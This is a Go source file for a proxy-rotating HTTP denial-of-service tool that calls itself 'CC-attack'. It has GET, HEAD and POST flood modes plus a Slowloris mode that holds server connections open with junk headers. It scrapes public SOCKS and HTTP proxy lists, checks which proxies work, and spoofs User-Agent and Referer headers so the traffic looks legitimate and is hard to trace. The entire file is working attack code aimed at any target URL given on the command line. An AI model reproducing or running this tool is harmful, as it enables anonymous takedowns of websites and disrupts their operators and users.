package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

// ==========================================
// 全局变量定义
// ==========================================

var acceptall = []string{
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept-Encoding: gzip, deflate\r\n",
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xhtml+xml",
	"Accept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
}

var referers = []string{
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
}

// Default value
var (
	mode       = "cc"
	proxy_ver  = "5"
	brute      = false
	out_file   = "proxy.txt"
	thread_num = 800
	data       = ""
	cookies    = ""
	proxies    []string // 全局代理列表
	
	// 新增：检查限制 (-n)
	checkLimit = 0
	// 新增：超时设置 (-ms), 默认为10秒
	timeoutSec = 10
	
	// 解析后的 URL 变量
	target   string
	path     string
	port     int
	protocol string
)

func Intn(min, max int) int {
	if max <= min {
		return min
	}
	return rand.Intn(max-min) + min
}

func Choice(items []string) string {
	if len(items) == 0 {
		return ""
	}
	return items[rand.Intn(len(items))]
}

func randomURandom(length int) string {
	bytes := make([]byte, length)
	rand.Read(bytes)
	return string(bytes)
}

// ==========================================
// 随机字符串处理逻辑
// ==========================================

const (
	charsetNum   = "0123456789"
	charsetAlpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	charsetMix   = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
)

// 生成指定模式和长度的随机字符串
func generateRandomString(mode string, length int) string {
	var charset string
	switch mode {
	case "num":
		charset = charsetNum
	case "alpha":
		charset = charsetAlpha
	case "mix":
		charset = charsetMix
	default:
		charset = charsetMix
	}

	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// 处理数据模板，替换标签
func processDataTemplate(template string) string {
	// 正则匹配 {rand:mode:length}，例如 {rand:num:10}
	re := regexp.MustCompile(`\{rand:(num|alpha|mix):(\d+)\}`)
	
	return re.ReplaceAllStringFunc(template, func(match string) string {
		// 解析匹配到的标签，例如 {rand:num:10}
		submatches := re.FindStringSubmatch(match)
		if len(submatches) == 3 {
			mode := submatches[1]
			length, err := strconv.Atoi(submatches[2])
			if err != nil {
				return match // 解析失败返回原样
			}
			return generateRandomString(mode, length)
		}
		return match
	})
}

// ==========================================
// 核心逻辑函数
// ==========================================

func build_threads(mode string, thread_num int, startChan chan struct{}, proxy_type int) {
	for i := 0; i < thread_num; i++ {
		if mode == "post" {
			go post(startChan, proxy_type)
		} else if mode == "cc" {
			go cc(startChan, proxy_type)
		} else if mode == "head" {
			go head(startChan, proxy_type)
		} else if mode == "slow" {
			go slow(startChan, proxy_type) // 新增慢速攻击
		}
	}
}

func getuseragent() string {
	platform := Choice([]string{"Macintosh", "Windows", "X11"})
	var os_name string
	if platform == "Macintosh" {
		os_name = Choice([]string{"68K", "PPC", "Intel Mac OS X"})
	} else if platform == "Windows" {
		os_name = Choice([]string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"})
	} else if platform == "X11" {
		os_name = Choice([]string{"Linux i686", "Linux x86_64"})
	}
	
	browser := Choice([]string{"chrome", "firefox", "ie"})
	if browser == "chrome" {
		webkit := strconv.Itoa(Intn(500, 599))
		version := strconv.Itoa(Intn(0, 99)) + ".0" + strconv.Itoa(Intn(0, 9999)) + "." + strconv.Itoa(Intn(0, 999))
		return "Mozilla/5.0 (" + os_name + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + version + " Safari/" + webkit
	} else if browser == "firefox" {
		currentYear := time.Now().Year()
		year := strconv.Itoa(Intn(2020, currentYear))
		month := Intn(1, 12)
		var monthStr string
		if month < 10 {
			monthStr = "0" + strconv.Itoa(month)
		} else {
			monthStr = strconv.Itoa(month)
		}
		day := Intn(1, 30)
		var dayStr string
		if day < 10 {
			dayStr = "0" + strconv.Itoa(day)
		} else {
			dayStr = strconv.Itoa(day)
		}
		gecko := year + monthStr + dayStr
		version := strconv.Itoa(Intn(1, 72)) + ".0"
		return "Mozilla/5.0 (" + os_name + "; rv:" + version + ") Gecko/" + gecko + " Firefox/" + version
	} else if browser == "ie" {
		version := strconv.Itoa(Intn(1, 99)) + ".0"
		engine := strconv.Itoa(Intn(1, 99)) + ".0"
		option := Choice([]string{"True", "False"})
		token := ""
		if option == "True" {
			token = Choice([]string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}) + "; "
		}
		return "Mozilla/5.0 (compatible; MSIE " + version + "; " + os_name + "; " + token + "Trident/" + engine + ")"
	}
	return ""
}

func randomurl() string {
	return strconv.Itoa(Intn(0, 271400281257))
}

func GenReqHeader(method string) string {
	header := ""
	if method == "get" || method == "head" {
		connection := "Connection: Keep-Alive\r\n"
		if cookies != "" {
			connection += "Cookies: " + cookies + "\r\n"
		}
		accept := Choice(acceptall)
		referer := "Referer: " + Choice(referers) + target + path + "\r\n"
		useragent := "User-Agent: " + getuseragent() + "\r\n"
		header = referer + useragent + accept + connection + "\r\n"
	} else if method == "post" {
		post_host := "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		content := "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
		refer := "Referer: http://" + target + path + "\r\n"
		user_agent := "User-Agent: " + getuseragent() + "\r\n"
		accept := Choice(acceptall)
		
		payload := ""
		if data == "" {
			payload = randomURandom(16)
		} else {
			payload = processDataTemplate(data)
		}
		
		length := "Content-Length: " + strconv.Itoa(len(payload)) + " \r\nConnection: Keep-Alive\r\n"
		if cookies != "" {
			length += "Cookies: " + cookies + "\r\n"
		}
		header = post_host + accept + refer + content + user_agent + length + "\n" + payload + "\r\n\r\n"
	}
	return header
}

func ParseUrl(original_url string) {
	original_url = strings.TrimSpace(original_url)
	url_tmp := ""
	path = "/"
	port = 80
	protocol = "http"
	
	if strings.HasPrefix(original_url, "http://") {
		url_tmp = original_url[7:]
	} else if strings.HasPrefix(original_url, "https://") {
		url_tmp = original_url[8:]
		protocol = "https"
	} else {
		fmt.Println("> That looks like not a correct url.")
		os.Exit(0)
	}

	tmp := strings.Split(url_tmp, "/")
	website := tmp[0]
	check := strings.Split(website, ":")
	if len(check) != 1 {
		p, _ := strconv.Atoi(check[1])
		port = p
	} else {
		if protocol == "https" {
			port = 443
		}
	}
	target = check[0]
	if len(tmp) > 1 {
		path = strings.Replace(url_tmp, website, "", 1)
	}
}

func createSocket(proxy_type int, proxy_ip string, proxy_port int) (net.Conn, error) {
	addr := fmt.Sprintf("%s:%d", target, port)
	timeout := 10 * time.Second 

	if proxy_type == 0 { 
		proxyAddr := fmt.Sprintf("%s:%d", proxy_ip, proxy_port)
		conn, err := net.DialTimeout("tcp", proxyAddr, timeout)
		if err != nil {
			return nil, err
		}

		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, addr)
		conn.SetDeadline(time.Now().Add(timeout))
		_, err = conn.Write([]byte(connectReq))
		if err != nil {
			conn.Close()
			return nil, err
		}

		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		if err != nil {
			conn.Close()
			return nil, err
		}
		
		conn.SetDeadline(time.Time{})

		if !strings.Contains(string(buf[:n]), "200") {
			conn.Close()
			return nil, fmt.Errorf("proxy handshake failed: %s", string(buf[:n]))
		}

		if protocol == "https" {
			tlsConfig := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         target,
			}
			conn = tls.Client(conn, tlsConfig)
		}

		return conn, nil
	}

	var d proxy.Dialer
	var err error

	if proxy_type == 5 || proxy_type == 4 {
		d, err = proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", proxy_ip, proxy_port), nil, proxy.Direct)
	}
	
	if err != nil {
		return nil, err
	}

	conn, err := d.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}
	
	if protocol == "https" && proxy_type != 0 {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         target,
		}
		conn = tls.Client(conn, tlsConfig)
	}
	
	return conn, nil
}

func cc(startChan chan struct{}, proxy_type int) {
	header := GenReqHeader("get")
	proxy_str := strings.TrimSpace(Choice(proxies))
	proxy_parts := strings.Split(proxy_str, ":")
	if len(proxy_parts) < 2 { return }
	
	add := "?"
	if strings.Contains(path, "?") {
		add = "&"
	}

	<-startChan
	
	for {
		p_port, _ := strconv.Atoi(proxy_parts[1])
		s, err := createSocket(proxy_type, proxy_parts[0], p_port)
		
		if err == nil {
			for i := 0; i < 100; i++ {
				get_host := "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
				request := get_host + header
				
				_, err := s.Write([]byte(request))
				if err != nil {
					proxy_str = strings.TrimSpace(Choice(proxies))
					proxy_parts = strings.Split(proxy_str, ":")
					break
				}
			}
			s.Close()
		} else {
			proxy_str = strings.TrimSpace(Choice(proxies))
			proxy_parts = strings.Split(proxy_str, ":")
		}
	}
}

func head(startChan chan struct{}, proxy_type int) {
	header := GenReqHeader("head")
	proxy_str := strings.TrimSpace(Choice(proxies))
	proxy_parts := strings.Split(proxy_str, ":")
	if len(proxy_parts) < 2 { return }

	add := "?"
	if strings.Contains(path, "?") {
		add = "&"
	}

	<-startChan

	for {
		p_port, _ := strconv.Atoi(proxy_parts[1])
		s, err := createSocket(proxy_type, proxy_parts[0], p_port)
		
		if err == nil {
			for i := 0; i < 100; i++ {
				head_host := "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
				request := head_host + header
				_, err := s.Write([]byte(request))
				if err != nil {
					proxy_str = strings.TrimSpace(Choice(proxies))
					proxy_parts = strings.Split(proxy_str, ":")
					break
				}
			}
			s.Close()
		} else {
			proxy_str = strings.TrimSpace(Choice(proxies))
			proxy_parts = strings.Split(proxy_str, ":")
		}
	}
}

func post(startChan chan struct{}, proxy_type int) {
	request := GenReqHeader("post")

	proxy_str := strings.TrimSpace(Choice(proxies))
	proxy_parts := strings.Split(proxy_str, ":")
	if len(proxy_parts) < 2 { return }

	<-startChan

	for {
		p_port, _ := strconv.Atoi(proxy_parts[1])
		s, err := createSocket(proxy_type, proxy_parts[0], p_port)
		
		if err == nil {
			request = GenReqHeader("post") 

			for i := 0; i < 100; i++ {
				_, err := s.Write([]byte(request))
				if err != nil {
					proxy_str = strings.TrimSpace(Choice(proxies))
					proxy_parts = strings.Split(proxy_str, ":")
					break
				}
			}
			s.Close()
		} else {
			proxy_str = strings.TrimSpace(Choice(proxies))
			proxy_parts = strings.Split(proxy_str, ":")
		}
	}
}

// ==========================================
// 新增：Slowloris 慢速攻击模式
// ==========================================
func slow(startChan chan struct{}, proxy_type int) {
	// 1. 构造一个不完整的 HTTP 头部 (Partial Header)
	// 注意：末尾没有 \r\n\r\n，只有 \r\n，表示 Header 还没发完
	// 我们不使用 Content-Length (或设一个很大的值)，重点是不发送结束符
	
	// 随机选择一个初始 User-Agent
	ua := getuseragent()
	
	// 如果需要带 Cookie
	cookieLine := ""
	if cookies != "" {
		cookieLine = "Cookie: " + cookies + "\r\n"
	}
	
	// 基础头部
	baseHeader := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n%sConnection: keep-alive\r\nContent-Length: 42\r\n", path, target, ua, cookieLine)

	proxy_str := strings.TrimSpace(Choice(proxies))
	proxy_parts := strings.Split(proxy_str, ":")
	if len(proxy_parts) < 2 { return }

	<-startChan

	for {
		p_port, _ := strconv.Atoi(proxy_parts[1])
		
		// 建立连接
		s, err := createSocket(proxy_type, proxy_parts[0], p_port)
		
		if err == nil {
			// 2. 发送初始部分头部
			_, err = s.Write([]byte(baseHeader))
			if err != nil {
				s.Close()
				proxy_str = strings.TrimSpace(Choice(proxies))
				proxy_parts = strings.Split(proxy_str, ":")
				continue
			}
			
			// 3. 进入慢速循环：每隔几秒发一个垃圾头
			// 保持连接不被服务器踢掉，同时占用连接槽
			for {
				// 随机睡眠 5-15 秒
				sleepTime := time.Duration(Intn(5, 15)) * time.Second
				time.Sleep(sleepTime)
				
				// 发送垃圾键值对，例如 "X-a: 123\r\n"
				// 注意这里依然不发送 \r\n\r\n
				garbageHeader := fmt.Sprintf("X-%s: %d\r\n", generateRandomString("alpha", 5), Intn(1, 10000))
				
				_, err = s.Write([]byte(garbageHeader))
				if err != nil {
					// 写入失败，说明连接断了，跳出内循环，重新建立连接
					break 
				}
				// 成功写入，继续持有连接
			}
			s.Close()
		} else {
			// 连接代理失败，换个代理
			proxy_str = strings.TrimSpace(Choice(proxies))
			proxy_parts = strings.Split(proxy_str, ":")
		}
	}
}

// ==========================================
// 代理检测与下载逻辑
// ==========================================

var checkedNums = 0
var validNums = 0
var validProxies []string
var checkMutex sync.Mutex

var stopCheck = false

func checkOneProxy(line string, proxy_type int, timeout time.Duration) bool {
	p_parts := strings.Split(strings.TrimSpace(line), ":")
	if len(p_parts) != 2 {
		return false
	}

	resultChan := make(chan bool, 1)

	go func() {
		p_port, _ := strconv.Atoi(p_parts[1])
		proxyAddr := fmt.Sprintf("%s:%d", p_parts[0], p_port)
		targetTest := "1.1.1.1:80"

		var conn net.Conn
		var err error

		if proxy_type == 5 || proxy_type == 4 {
			dialer := &net.Dialer{
				Timeout:   timeout,
				KeepAlive: -1,
			}
			var d proxy.Dialer
			d, err = proxy.SOCKS5("tcp", proxyAddr, nil, dialer)
			if err == nil {
				conn, err = d.Dial("tcp", targetTest)
			}
		} else {
			conn, err = net.DialTimeout("tcp", proxyAddr, timeout)
			if err == nil {
				conn.SetDeadline(time.Now().Add(timeout))
				connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", targetTest, targetTest)
				_, err = conn.Write([]byte(connectReq))
				
				if err == nil {
					buf := make([]byte, 1024)
					var n int
					n, err = conn.Read(buf)
					if err != nil || !strings.Contains(string(buf[:n]), "200") {
						conn.Close()
						resultChan <- false
						return
					}
				}
			}
		}

		if err != nil {
			resultChan <- false
			return
		}

		conn.SetDeadline(time.Now().Add(timeout)) 
		_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: 1.1.1.1\r\n\r\n"))
		if err != nil {
			conn.Close()
			resultChan <- false
			return
		}

		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		conn.Close()
		
		resultChan <- (n > 0)
	}()

	select {
	case res := <-resultChan:
		return res
	case <-time.After(timeout):
		return false
	}
}


func checking(lines string, proxy_type int, ms int, wg *sync.WaitGroup) {
	defer wg.Done()
	
	if stopCheck { return }

	timeout := time.Duration(ms) * time.Second
	isValid := checkOneProxy(lines, proxy_type, timeout)

	checkMutex.Lock()
	checkedNums++
	if isValid {
		validNums++
		validProxies = append(validProxies, lines)
		if checkLimit > 0 && validNums >= checkLimit {
			stopCheck = true
		}
	}
	
	targetStr := "ALL"
	if checkLimit > 0 {
		targetStr = strconv.Itoa(checkLimit)
	}
	fmt.Printf("\r> Checked %d | Valid %d (Target: %s)", checkedNums, validNums, targetStr)
	checkMutex.Unlock()
}

func check_socks(ms int) {
	maxConcurrency := 2000 
	sem := make(chan struct{}, maxConcurrency) 

	var wg sync.WaitGroup
	fmt.Println("> Checking proxies...")
	
	checkMutex.Lock()
	checkedNums = 0
	validNums = 0
	validProxies = []string{}
	stopCheck = false
	checkMutex.Unlock()

	for _, line := range proxies {
		if stopCheck {
			break
		}

		wg.Add(1)
		sem <- struct{}{} 
		
		pt := 5
		if proxy_ver == "4" { pt = 4 }
		if proxy_ver == "http" { pt = 0 }
		
		go func(l string, p int) {
			defer func() { <-sem }() 
			checking(l, p, ms, &wg)
		}(line, pt)
	}
	wg.Wait()
	
	fmt.Printf("\n> Finished. Total Valid: %d\n", len(validProxies))

	if len(validProxies) > 0 {
		f, err := os.Create(out_file)
		if err == nil {
			defer f.Close()
			for _, vp := range validProxies {
				f.WriteString(vp + "\n")
			}
			fmt.Printf("> Saved %d valid proxies to %s\n", len(validProxies), out_file)
			proxies = validProxies
		}
	} else {
		fmt.Println("> No valid proxies found.")
	}
}

func check_list(socks_file string) {
	fmt.Println("> Checking list")
	content, err := ioutil.ReadFile(socks_file)
	if err != nil { return }
	
	temp_list := []string{}
	lines := strings.Split(string(content), "\n")
	
	seen := make(map[string]bool)
	
	for _, i := range lines {
		i = strings.TrimSpace(i)
		if i == "" { continue }
		if !seen[i] {
			if strings.Contains(i, ":") && !strings.Contains(i, "#") {
				parts := strings.Split(i, ":")
				if net.ParseIP(parts[0]) != nil {
					temp_list = append(temp_list, i)
					seen[i] = true
				}
			}
		}
	}
	
	f, _ := os.Create(socks_file)
	defer f.Close()
	for _, i := range temp_list {
		f.WriteString(i + "\n")
	}
}

func DownloadProxies(proxy_ver string) {
	f, err := os.Create(out_file)
	if err != nil { return }
	defer f.Close()
	
	var api_list []string

	if proxy_ver == "4" {
		api_list = []string{
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
			"https://openproxylist.xyz/socks4.txt",
			"https://proxyspace.pro/socks4.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxyscan.io/download?type=socks4",
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
			"https://api.openproxylist.xyz/socks4.txt",
		}
	} else if proxy_ver == "5" {
		api_list = []string{
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://www.proxyscan.io/download?type=socks5",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
			"https://api.openproxylist.xyz/socks5.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
			"https://openproxylist.xyz/socks5.txt",
			"https://proxyspace.pro/socks5.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
		}
	} else if proxy_ver == "http" {
		api_list = []string{
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
			"https://www.proxy-list.download/api/v1/get?type=http",
			"https://www.proxyscan.io/download?type=http",
			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
			"https://api.openproxylist.xyz/http.txt",
			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
			"http://alexa.lr2b.com/proxylist.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
			"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
			"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
			"https://proxy-spider.com/api/proxies.example.txt",
			"https://multiproxy.org/txt_all/proxy.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
			"https://openproxylist.xyz/http.txt",
			"https://proxyspace.pro/http.txt",
			"https://proxyspace.pro/https.txt",
			"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
			"https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
			"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
			"https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
			"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
			"https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
			"https://rootjazz.com/proxies/proxies.txt",
			"https://sheesh.rip/http.txt",
			"https://www.proxy-list.download/api/v1/get?type=https",
		}
	}

	fmt.Println("> Downloading proxies...")
	for _, api := range api_list {
		resp, err := http.Get(api)
		if err != nil {
			continue
		}
		body, _ := ioutil.ReadAll(resp.Body)
		f.Write(body)
		f.Write([]byte("\n")) 
		resp.Body.Close()
		fmt.Println("> Fetched from:", api)
	}
	fmt.Println("> Have already downloaded proxies list as " + out_file)
}

func PrintHelp() {
	fmt.Println(`===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode [cc/head/post/slow]
             | slow: Slowloris mode (keeps connection open)
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -n        | set target valid proxies number (e.g. -n 1000)
   -ms       | set check timeout in seconds (default: 10)
   -down     | download proxies
   -check    | check proxies
=====================================================`)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	args := os.Args
	check_proxies := false
	download_socks := false
	proxy_type := 5
	period := 60
	show_help := false

	fmt.Println("> Mode: [cc/post/head/slow]")

	for n, arg := range args {
		if arg == "-help" || arg == "-h" {
			show_help = true
		}
		if arg == "-url" {
			if n+1 < len(args) { ParseUrl(args[n+1]) }
		}
		if arg == "-m" || arg == "-mode" {
			if n+1 < len(args) { mode = args[n+1] }
		}
		if arg == "-v" {
			if n+1 < len(args) {
				proxy_ver = args[n+1]
				if proxy_ver == "4" {
					proxy_type = 4
				} else if proxy_ver == "5" {
					proxy_type = 5
				} else if proxy_ver == "http" {
					proxy_type = 0
				}
			}
		}
		if arg == "-b" {
			// brute logic omitted/simplified
		}
		if arg == "-t" {
			if n+1 < len(args) {
				t, err := strconv.Atoi(args[n+1])
				if err == nil { thread_num = t }
			}
		}
		if arg == "-cookies" {
			if n+1 < len(args) { cookies = args[n+1] }
		}
		if arg == "-data" {
			if n+1 < len(args) {
				content, err := ioutil.ReadFile(args[n+1])
				if err == nil {
					data = string(content)
				}
			}
		}
		if arg == "-f" {
			if n+1 < len(args) { out_file = args[n+1] }
		}
		if arg == "-down" {
			download_socks = true
		}
		if arg == "-check" {
			check_proxies = true
		}
		if arg == "-s" {
			if n+1 < len(args) {
				p, err := strconv.Atoi(args[n+1])
				if err == nil { period = p }
			}
		}
		if arg == "-n" {
			if n+1 < len(args) {
				num, err := strconv.Atoi(args[n+1])
				if err == nil { checkLimit = num }
			}
		}
		if arg == "-ms" {
			if n+1 < len(args) {
				ms, err := strconv.Atoi(args[n+1])
				if err == nil { timeoutSec = ms }
			}
		}
	}

	if download_socks {
		DownloadProxies(proxy_ver)
	}

	if _, err := os.Stat(out_file); os.IsNotExist(err) {
		fmt.Println("Proxies file not found")
		return
	}

	content, _ := ioutil.ReadFile(out_file)
	lines := strings.Split(string(content), "\n")
	for _, l := range lines {
		if strings.TrimSpace(l) != "" {
			proxies = append(proxies, l)
		}
	}
	
	check_list(out_file)
	
	if len(proxies) == 0 {
		fmt.Println("> There are no more proxies. Please download a new proxies list.")
		return
	}
	
	fmt.Printf("> Number Of Proxies: %d\n", len(proxies))
	
	if check_proxies {
		check_socks(timeoutSec)
	}
	
	if show_help {
		PrintHelp()
	}
	
	if target == "" {
		fmt.Println("> There is no target. End of process ")
		return
	}

	startChan := make(chan struct{})
	fmt.Println("> Building threads...")
	build_threads(mode, thread_num, startChan, proxy_type)
	
	close(startChan) 
	
	fmt.Println("> Flooding...")
	time.Sleep(time.Duration(period) * time.Second)
}

